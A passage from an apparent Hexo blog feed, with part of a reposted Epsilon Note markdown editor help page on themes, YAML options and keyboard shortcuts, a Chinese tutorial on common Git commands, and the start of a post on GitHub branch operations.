<td style="background-color:#F9FBE7;color:#827717"> lime-light </td>
</tr>
<tr>
<td style="background-color:#F57F17;color:#FFFDE7"> yellow </td>
<td style="background-color:#FFFDE7;color:#F57F17"> yellow-light </td>
</tr>
<tr>
<td style="background-color:#FF6F00;color:#FFF8E1"> amber </td>
<td style="background-color:#FFF8E1;color:#FF6F00"> amber-light </td>
</tr>
<tr>
<td style="background-color:#E65100;color:#FFF3E0"> orange </td>
<td style="background-color:#FFF3E0;color:#E65100"> orange-light </td>
</tr>
<tr>
<td style="background-color:#BF360C;color:#FBE9E7"> deeporange </td>
<td style="background-color:#FBE9E7;color:#BF360C"> deeporange-light </td>
</tr>
<tr>
<td style="background-color:#3E2723;color:#EFEBE9"> brown </td>
<td style="background-color:#EFEBE9;color:#3E2723"> brown-light </td>
</tr>
<tr>
<td style="background-color:#212121;color:#FAFAFA"> grey </td>
<td style="background-color:#FAFAFA;color:#212121"> grey-light </td>
</tr>
<tr>
<td style="background-color:#263238;color:#ECEFF1"> bluegrey </td>
<td style="background-color:#ECEFF1;color:#263238"> bluegrey-light </td>
</tr>
</table>
<center>
<p><font color="red"><strong>The free version contains only two colors for testing purposes:</strong></font></p>
<p><strong>blue</strong></p>
<p><strong>blue-light</strong></p>
<p>All other colors are in the <strong>Premium Version</strong></p>
</center>
<hr />
<h4 id="using-themes-with-the-help-of-yamls-借助yamls设置主题"><a class="markdownIt-Anchor" href="#using-themes-with-the-help-of-yamls-借助yamls设置主题"></a> Using Themes with the help of YAMLs （借助YAMLs设置主题）☆</h4>
<p>To paint your page into one of the material colors, you need to add the following YAML declaration at the top of the page:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Style: blue</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Or any other color (in the Premium Version). For example, for ❤<font color="red"><strong>love stories</strong></font>❤, you can use the following style:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Style: pink-light</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>You can write the following YAML at the top of your document to make it show a different style every time you open your note:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Style: random</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>You can make only light or dark styles switch on randomly:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Style: random-light</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Style: random-dark</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="appbar-colorapp颜色自适应设置"><a class="markdownIt-Anchor" href="#appbar-colorapp颜色自适应设置"></a> Appbar color（app颜色自适应设置）</h4>
<p>Appbar YAML. If you use a user style and you want the application bar have a specific color, you can use the YAML as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Appbar: blue</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>Note:</strong> use one of the material colors corresponding to a theme.</p>
<h4 id="view-mode-fonts视图模式字体"><a class="markdownIt-Anchor" href="#view-mode-fonts视图模式字体"></a> View mode fonts（视图模式字体）</h4>
<p>Use Yaml to provide path to a local font in an individual file, fo example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">Font: file:&#x2F;&#x2F;&#x2F;storage&#x2F;...&#x2F;HelveticaNeue Light.ttf</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<hr />
<h4 id="setting-themes-as-defaults设置默认主题"><a class="markdownIt-Anchor" href="#setting-themes-as-defaults设置默认主题"></a> Setting themes as defaults（设置默认主题） ☆</h4>
<p>You can use a name of the style to set it as default instead of the standard CSS styles.</p>
<p>For example, if you wish the <strong>bluegrey</strong> style to be used as the default night style, go to the Preferences &gt; CSS Styles &gt; Night Style, <em>delete the whole style text</em>, and write there <code>bluegrey</code>. After you exit the Preferences, this field will automatically be filled with the bluegrey style. <em>(Note: Premium function)</em>.</p>
<hr />
<h4 id="disabling-theme-yamls禁用ymals主题"><a class="markdownIt-Anchor" href="#disabling-theme-yamls禁用ymals主题"></a> Disabling theme YAMLs（禁用YMALs主题）</h4>
<p>If you provided style YAMLs in all of your notes, and after some time, you feel tired of so many colors, you can turn off the material color styles in the Preferences &gt; YAML preamble &gt; Allow styles.</p>
<p>In this case, only the default 5 styles will be working (day, night, white, black, user).</p>
<hr />
<p><a name="all-yaml"></a></p>
<h2 id="all-available-yaml-properties所有可用的-yaml-属性"><a class="markdownIt-Anchor" href="#all-available-yaml-properties所有可用的-yaml-属性"></a> All available YAML properties（所有可用的 YAML 属性）</h2>
<table>
<thead>
<tr>
<th style="text-align:left">YAML</th>
<th style="text-align:left">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">appbar:blue</td>
<td style="text-align:left">Sets a material color for the application bar</td>
</tr>
<tr>
<td style="text-align:left">back:filename</td>
<td style="text-align:left"><em>(deprecated)</em> <s>File to open on pressing the back button</s></td>
</tr>
<tr>
<td style="text-align:left">code:highlight</td>
<td style="text-align:left"><em>(deprecated)</em> <s>Highlight codeblocks</s></td>
</tr>
<tr>
<td style="text-align:left">code:none</td>
<td style="text-align:left">Do not highlight codeblocks</td>
</tr>
<tr>
<td style="text-align:left">date:2016-11-20  <sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></td>
<td style="text-align:left">Show this date at the top</td>
</tr>
<tr>
<td style="text-align:left">Font: file:///storage/ … /HelveticaNeue Light.ttf</td>
<td style="text-align:left">Setting a font for the view mode</td>
</tr>
<tr>
<td style="text-align:left">heading:autonumber</td>
<td style="text-align:left">Autonumbering headings from level 2</td>
</tr>
<tr>
<td style="text-align:left">heading:totop</td>
<td style="text-align:left">Tapping on a heading scrolls the page to top</td>
</tr>
<tr>
<td style="text-align:left"><code>prerender:|<br> regex1<br> replacement1<br> regex2<br> replacement2<br></code></td>
<td style="text-align:left">Preprocessing in a document</td>
</tr>
<tr>
<td style="text-align:left">style:black</td>
<td style="text-align:left">Force black style</td>
</tr>
<tr>
<td style="text-align:left">style:day</td>
<td style="text-align:left">Force day style</td>
</tr>
<tr>
<td style="text-align:left">style:night</td>
<td style="text-align:left">Force night style</td>
</tr>
<tr>
<td style="text-align:left">style:white</td>
<td style="text-align:left">Force white style</td>
</tr>
<tr>
<td style="text-align:left">style:user</td>
<td style="text-align:left">Force user style</td>
</tr>
<tr>
<td style="text-align:left">style:nostyle</td>
<td style="text-align:left">Turn off any style in the document. You can provide an inline style then.</td>
</tr>
<tr>
<td style="text-align:left">style:file.css <sup class="footnote-ref"><a href="#fn3" id="fnref3:1">[3:1]</a></sup></td>
<td style="text-align:left">Use the file.css from the current directory</td>
</tr>
<tr>
<td style="text-align:left">style:http://…/style.css</td>
<td style="text-align:left">Use style from Internet</td>
</tr>
<tr>
<td style="text-align:left">style:file:///…/style.css</td>
<td style="text-align:left">Specify absolute link to the style</td>
</tr>
<tr>
<td style="text-align:left">title:some_name <sup class="footnote-ref"><a href="#fn3" id="fnref3:2">[3:2]</a></sup></td>
<td style="text-align:left">Generate title. Can be turned off via Preferences</td>
</tr>
<tr>
<td style="text-align:left">toc:some_name <sup class="footnote-ref"><a href="#fn3" id="fnref3:3">[3:3]</a></sup></td>
<td style="text-align:left">Generate Table of contents</td>
</tr>
<tr>
<td style="text-align:left">toc-style:inline</td>
<td style="text-align:left">Place ToC in one centered line</td>
</tr>
<tr>
<td style="text-align:left">uses:abc</td>
<td style="text-align:left">Turn on ABC Music Notation plugin. <em>See help for advanced users.</em></td>
</tr>
<tr>
<td style="text-align:left">uses:mathjax</td>
<td style="text-align:left">Turn on MathJax plugin. <strong>NB:</strong> The plugin is cached from the Internet. Due to its high weight, it was not included in the app. <em>See help for advanced users.</em></td>
</tr>
</tbody>
</table>
<p><strong>Reminder:</strong></p>
<p>To use several values for one property, write:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">heading:</span><br><span class="line"> -autonumber</span><br><span class="line"> -totop</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h1 id="miscellaneous混杂的其他"><a class="markdownIt-Anchor" href="#miscellaneous混杂的其他"></a> Miscellaneous(混杂的／其他)</h1>
<h2 id="print-pdfpdf-打印"><a class="markdownIt-Anchor" href="#print-pdfpdf-打印"></a> Print PDF（PDF 打印）</h2>
<p>Create pdf documents from the current view using Android’s standard pdf printer. To do that, go to <code>Menu-&gt;Print PDF</code>. The program first prepares the view and then offers to send it to the pdf printer.</p>
<p><strong>NOTA BENE: <font color="red">This function is available only with Android 4.4 and above.</font></strong></p>
<h2 id="jquery支持jquery库"><a class="markdownIt-Anchor" href="#jquery支持jquery库"></a> JQuery（支持jQuery库）</h2>
<ul>
<li>JQuery library is included for writing extended javascripts in documents.</li>
</ul>
<hr />
<h2 id="keyboard-shortcuts-for-edit-mode编辑模式下的快捷键"><a class="markdownIt-Anchor" href="#keyboard-shortcuts-for-edit-mode编辑模式下的快捷键"></a> Keyboard shortcuts for <strong>Edit Mode</strong>（编辑模式下的快捷键）</h2>
<p><strong>Standard English keyboard.</strong> Tested on a bluetooth keyboard “Genius” and on-screen <a href="https://play.google.com/store/apps/details?id=org.pocketworkstation.pckeyboard" target="_blank" rel="noopener">“Hacker’s keyboard”</a>.</p>
<table>
<thead>
<tr>
<th>Kbd shortcuts</th>
<th>Action and mnemonic</th>
</tr>
</thead>
<tbody>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>A</kbd></td>
<td>Select <strong>A</strong>ll</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>B</kbd></td>
<td><strong>B</strong>old</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>C</kbd></td>
<td><strong>C</strong>opy</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>D</kbd></td>
<td>Insert <strong>D</strong>ate</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>E</kbd></td>
<td>Strikethrough (<strong>E</strong>rase)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>F</kbd></td>
<td>Insert <strong>F</strong>ont Color tag <code>&lt;font color=&quot;red&quot;&gt;&lt;/font&gt;</code></td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>G</kbd></td>
<td>Open <strong>G</strong>allery to insert picture</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>H</kbd></td>
<td><strong>H</strong>ighlight</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>I</kbd></td>
<td><strong>I</strong>talic</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>J</kbd></td>
<td>Tab (<strong>J</strong>ump 4 spaces)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>K</kbd></td>
<td>Hide / show symbol bar (<strong>K</strong>eyboard) <strong><font color="red">(Beware not to lose your Symbol Bar!!!)</font></strong></td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>L</kbd></td>
<td>Select <strong>L</strong>ine</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>M</kbd></td>
<td>Insert from shared text or template Buffer (i<strong>M</strong>port)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>N</kbd></td>
<td>Insert a<strong>N</strong>chor with a <strong>N</strong>ame <code>&lt;a id=&quot;name&quot;&gt;&lt;/a&gt;</code></td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>O</kbd></td>
<td>s<strong>O</strong>rt selected lines <br> (Reverse sort is available only through the long-tap on the on-screen symbol bar. <br> To select several lines, use <kbd>Ctrl</kbd>+<kbd>L</kbd>)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>P</kbd></td>
<td><strong>P</strong>review and <strong>P</strong>rint</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Q</kbd></td>
<td>Cancel edit (<strong>Q</strong>uit - press button twice!)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>R</kbd></td>
<td><strong>R</strong>egex <strong>R</strong>eplace</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>S</kbd></td>
<td><strong>S</strong>ave and exit edit mode</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>T</kbd></td>
<td>Insert <strong>T</strong>able</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>U</kbd></td>
<td><strong>U</strong>nderline</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>V</kbd></td>
<td>Paste (Paste is <strong>V</strong>ery close to the <strong>C</strong>ut button)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>W</kbd></td>
<td>Redo (Above the undo button)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>X</kbd></td>
<td>Cut (e<strong>X</strong>tract)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Y</kbd></td>
<td>Insert codeblock (c<strong>Y</strong>ber-language)</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Z</kbd></td>
<td>Undo (Undo all my error<strong>Z</strong> and mi<strong>Z</strong>takes)</td>
</tr>
</tbody>
</table>
<h3 id="additional-shortcuts附加快捷键"><a class="markdownIt-Anchor" href="#additional-shortcuts附加快捷键"></a> Additional shortcuts（附加快捷键）</h3>
<table>
<thead>
<tr>
<th>Kbd shortcuts</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>5</kbd></td>
<td>Jump to the top of the document</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>6</kbd></td>
<td>Jump to the bottom of the document</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>C</kbd></td>
<td>Alternative insert <strong>C</strong>odeblock</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>F</kbd></td>
<td>Insert <strong>F</strong>ootnote</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>H</kbd></td>
<td>Show <strong>H</strong>elp</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>S</kbd></td>
<td>Insert <strong>S</strong>uperscript</td>
</tr>
<tr>
<td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>Z</kbd></td>
<td>Alternative <strong>R</strong>edo button (See <kbd>Ctrl</kbd>+<kbd>W</kbd>)</td>
</tr>
</tbody>
</table>
<p><strong>NB:</strong> Soft keyboards may not support some keys.</p>
<h3 id="show-hide-symbol-bar显示隐藏-符号条"><a class="markdownIt-Anchor" href="#show-hide-symbol-bar显示隐藏-符号条"></a> Show / hide Symbol bar（显示／隐藏 符号条）</h3>
<p>If you work with a keyboard, you can hide the Symbol bar. Most of its functions are available through shortcuts. To hide it, uncheck the option at: <code>Menu - Preferences - Symbol bars - Show symbol bar</code></p>
<p>To show or hide it while working, press <kbd>Ctrl</kbd>+<kbd>K</kbd>.</p>
<p>______________</p>
<h1 id="footnotes脚注-2"><a class="markdownIt-Anchor" href="#footnotes脚注-2"></a> Footnotes（脚注）</h1>
<p>The symbol bar reserved words are:</p>
<ul>
<li>ANCHOR</li>
<li>BOLD</li>
<li>CANCEL</li>
<li>CODEBLOCK</li>
<li>COPY</li>
<li>CUT</li>
<li>DATE</li>
<li>FOOTNOTE</li>
<li>HELP</li>
<li>HIGHLIGHT</li>
<li>IMG</li>
<li>ITALIC</li>
<li>PASTE</li>
<li>PRINTPREVIEW</li>
<li>QUICKSELECTION</li>
<li>REDO</li>
<li>REGEXREPLACE</li>
<li>SELECTALL</li>
<li>SELECTLEFT</li>
<li>SELECTRIGHT</li>
<li>SORTLINES</li>
<li>STRIKETHROUGH</li>
<li>SUPERSCRIPT</li>
<li>TAB</li>
<li>TABLE</li>
<li>TOBOTTOM</li>
<li>TOTOP</li>
<li>UNDERLINE</li>
<li>UNDO</li>
</ul>
<blockquote>
<p>The U.S. Government announced that AES could be used to protect classified information. <a href="https://en.m.wikipedia.org/wiki/Advanced_Encryption_Standard#Security" target="_blank" rel="noopener">Source</a></p>
</blockquote>
<hr class="footnotes-sep" />
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"> <a href="#fnref1" class="footnote-backref">↩︎</a></li>
<li id="fn2" class="footnote-item"><p><mark>Hey, the comment is here!</mark> The back tag looks like <span>[</span>^comment]: It is at the beginning of this line. Click on it to return. <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p>The <strong>v</strong>alue is arbitrary <a href="#fnref3" class="footnote-backref">↩︎</a> <a href="#fnref3:1" class="footnote-backref">↩︎</a> <a href="#fnref3:2" class="footnote-backref">↩︎</a> <a href="#fnref3:3" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>Epsilon Note</tag>
      </tags>
  </entry>
  <entry>
    <title>Git 常用命令</title>
    <url>/hexolog/post/7065.html</url>
    <content><![CDATA[<p><a href="http://blog.csdn.net/top_code/article/details/51931589" target="_blank" rel="noopener" title="Permalink to Git常用命令 - Ricky - CSDN博客">转载 - Ricky - CSDN博客</a></p>
<h2 id="git常用命令"><a class="markdownIt-Anchor" href="#git常用命令"></a> Git常用命令</h2>
<h3 id="新建repository"><a class="markdownIt-Anchor" href="#新建repository"></a> 新建Repository</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">$ git init [project-name]</span><br><span class="line">$ git <span class="built_in">clone</span> [url]</span><br></pre></td></tr></table></figure>
<p>例如：<br />
1、创建本地Repository</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir pro-git</span><br><span class="line">$ <span class="built_in">cd</span> pro-git</span><br><span class="line">$ git init</span><br></pre></td></tr></table></figure>
<p>2、clone 远程Repository</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:FBing/design-patterns.git</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="初次运行-git-前的配置"><a class="markdownIt-Anchor" href="#初次运行-git-前的配置"></a> 初次运行 Git 前的配置</h3>
<p>既然已经在系统上安装了 Git，你会想要做几件事来定制你的 Git 环境。 每台计算机上只需要配置一次，程序升级时会保留配置信息。 你可以在任何时候再次通过运行命令来修改它们。</p>
<p>Git 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：</p>
<ol>
<li>
<p>/etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 –system 选项的 git config 时，它会从此文件读写配置变量。</p>
</li>
<li>
<p>~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 可以传递 –global 选项让 Git 读写此文件。</p>
</li>
<li>
<p>当前使用仓库的 Git 目录中的 config 文件（就是 .git/config）：针对该仓库。</p>
</li>
</ol>
<p>每一个级别覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。</p>
<h4 id="用户信息"><a class="markdownIt-Anchor" href="#用户信息"></a> 用户信息</h4>
<p>当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config [--global] user.name <span class="string">"Ricky Fung"</span></span><br><span class="line">$ git config [--global] user.email ricky_feng@163.com</span><br></pre></td></tr></table></figure>
<p>如果使用了 –global 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 –global 选项的命令来配置。</p>
<h4 id="查看配置信息"><a class="markdownIt-Anchor" href="#查看配置信息"></a> 查看配置信息</h4>
<p>如果想要检查你的配置，可以使用 git config –list 命令来列出所有 Git 当时能找到的配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --list</span><br><span class="line">core.symlinks=<span class="literal">false</span></span><br><span class="line">core.autocrlf=<span class="literal">false</span></span><br><span class="line">color.diff=auto</span><br><span class="line">color.status=auto</span><br><span class="line">color.branch=auto</span><br><span class="line">color.interactive=<span class="literal">true</span></span><br><span class="line">help.format=html</span><br><span class="line">http.sslcainfo=C:/Users/Ricky/AppData/Local/Programs/Git/mingw64/ssl/certs/ca-bundle.crt</span><br><span class="line">diff.astextplain.textconv=astextplain</span><br><span class="line">rebase.autosquash=<span class="literal">true</span></span><br><span class="line">user.name=Ricky Fung</span><br><span class="line">user.email=ricky_feng@163.com</span><br></pre></td></tr></table></figure>
<h3 id="查看当前文件状态"><a class="markdownIt-Anchor" href="#查看当前文件状态"></a> 查看当前文件状态</h3>
<p>要查看哪些文件处于什么状态，可以用 git status 命令。 如果在克隆仓库后立即使用此命令，会看到类似这样的输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working directory clean</span><br></pre></td></tr></table></figure>
<h3 id="添加文件"><a class="markdownIt-Anchor" href="#添加文件"></a> 添加文件</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add [file1] [file2] ...</span><br><span class="line">$ git add [dir]</span><br><span class="line">$ git add .</span><br><span class="line">$ git add -A</span><br></pre></td></tr></table></figure>
<h3 id="删除文件"><a class="markdownIt-Anchor" href="#删除文件"></a> 删除文件</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git rm [file1] [file2] ...</span><br></pre></td></tr></table></figure>
<h3 id="代码提交"><a class="markdownIt-Anchor" href="#代码提交"></a> 代码提交</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git commit -m [message]  如: git commit -m <span class="string">"modify"</span></span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line">$ git commit -a</span><br><span class="line">$ git commit -v</span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure>
<h3 id="标签"><a class="markdownIt-Anchor" href="#标签"></a> 标签</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git tag                            <span class="comment"># 查看当前分支下的所有标签</span></span><br><span class="line">$ git tag [tag name]</span><br><span class="line">$ git tag -a [tag name] -m [message]</span><br><span class="line">$ git tag -a [tag name] [version]</span><br><span class="line">$ git tag -d [tag]                       <span class="comment"># 删除标签</span></span><br><span class="line">$ git push origin :refs/tags/[tagname]</span><br><span class="line">$ git push origin --delete tag </span><br><span class="line">$ git show [tag]                         <span class="comment"># 查看标签信息</span></span><br><span class="line">$ git push [remote] [tag]</span><br><span class="line">$ git push [remote] --tags</span><br><span class="line">$ git checkout -b [branch] [tag]         <span class="comment"># 切换到标签</span></span><br></pre></td></tr></table></figure>
<h3 id="分支管理"><a class="markdownIt-Anchor" href="#分支管理"></a> 分支管理</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">$ git branch -r</span><br><span class="line">$ git branch -a</span><br><span class="line">$ git branch [branch-name]</span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line">$ git merge [branch]</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git push origin :[branch-name]</span><br></pre></td></tr></table></figure>
<h3 id="变基"><a class="markdownIt-Anchor" href="#变基"></a> 变基</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout dev</span><br><span class="line">$ git rebase master</span><br><span class="line">First, rewinding head to replay your work on top of it...</span><br><span class="line">Applying: added staged <span class="built_in">command</span></span><br></pre></td></tr></table></figure>
<h3 id="查看log"><a class="markdownIt-Anchor" href="#查看log"></a> 查看log</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
<h3 id="diff"><a class="markdownIt-Anchor" href="#diff"></a> diff</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git diff [file]</span><br></pre></td></tr></table></figure>
<h3 id="show"><a class="markdownIt-Anchor" href="#show"></a> show</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git show [version]</span><br><span class="line">$ git show --name-only [version]</span><br><span class="line">$ git show [version]:[filename]</span><br></pre></td></tr></table></figure>
<h3 id="远程同步"><a class="markdownIt-Anchor" href="#远程同步"></a> 远程同步</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git fetch [remote]</span><br><span class="line">$ git remote -v</span><br><span class="line">$ git remote show [remote]</span><br><span class="line">$ git remote add [shortname] [url]</span><br><span class="line">$ git pull [remote] [branch]</span><br><span class="line">$ git push [remote] [branch]</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2>
<p>《Pro Git 2nd Edition》</p>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Github 分支操作</title>
    <url>/hexolog/post/1371.html</url>
    <content><![CDATA[<h2 id="查看分支"><a class="markdownIt-Anchor" href="#查看分支"></a> 查看分支</h2>
<h3 id="查看本地分支"><a class="markdownIt-Anchor" href="#查看本地分支"></a> 查看本地分支</h3>
<p>使用 git branch命令，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure>
<p>*标识的是你当前所在的分支。</p>
<h3 id="查看远程分支"><a class="markdownIt-Anchor" href="#查看远程分支"></a> 查看远程分支</h3>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -r</span><br></pre></td></tr></table></figure>
<h3 id="查看所有分支"><a class="markdownIt-Anchor" href="#查看所有分支"></a> 查看所有分支</h3>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="本地创建新的分支"><a class="markdownIt-Anchor" href="#本地创建新的分支"></a> 本地创建新的分支</h2>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch [branch name]</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch gh-dev</span><br></pre></td></tr></table></figure>
<h2 id="切换到新的分支"><a class="markdownIt-Anchor" href="#切换到新的分支"></a> 切换到新的分支</h2>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout [branch name]</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ricky@DESKTOP-1QPASTR MINGW64 /f/Git_Studio/design-patterns (master)</span><br><span class="line">$ git checkout gh-dev</span><br><span class="line">Switched to branch <span class="string">'gh-dev'</span>    </span><br><span class="line">Ricky@DESKTOP-1QPASTR MINGW64 /f/Git_Studio/design-patterns (gh-dev)</span><br></pre></td></tr></table></figure>
<h2 id="创建切换分支"><a class="markdownIt-Anchor" href="#创建切换分支"></a> 创建+切换分支</h2>
<p>创建分支的同时切换到该分支上，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b [branch name]</span><br></pre></td></tr></table></figure>
<p>git checkout -b [branch name] 的效果相当于以下两步操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch [branch name]</span><br><span class="line">git checkout [branch name]</span><br></pre></td></tr></table></figure>
<h2 id="将新分支推送到github"><a class="markdownIt-Anchor" href="#将新分支推送到github"></a> 将新分支推送到github</h2>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin [branch name]</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin gh-dev</span><br></pre></td></tr></table></figure>
<h2 id="删除本地分支"><a class="markdownIt-Anchor" href="#删除本地分支"></a> 删除本地分支</h2>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -d [branch name]</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -d gh-dev</span><br></pre></td></tr></table></figure>
<h2 id="删除github远程分支"><a class="markdownIt-Anchor" href="#删除github远程分支"></a> 删除github远程分支</h2>
<p>命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin :[branch name]</span><br></pre></td></tr></table></figure>
<p>分支名前的冒号代表删除。<br />
例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin :gh-dev</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：通过 Pull request 创建的新分支默认会有一个 Pull request 的 Open 状态标识，这种状态下的分支是无法删除的（页面操作与命令行操作都无法删除），需要到 Pull request 选项里面将 Open 改为 close 后才可删除。</p>
</blockquote>
<h2 id="下载github某个单独分支"><a class="markdownIt-Anchor" href="#下载github某个单独分支"></a> 下载github某个单独分支</h2>
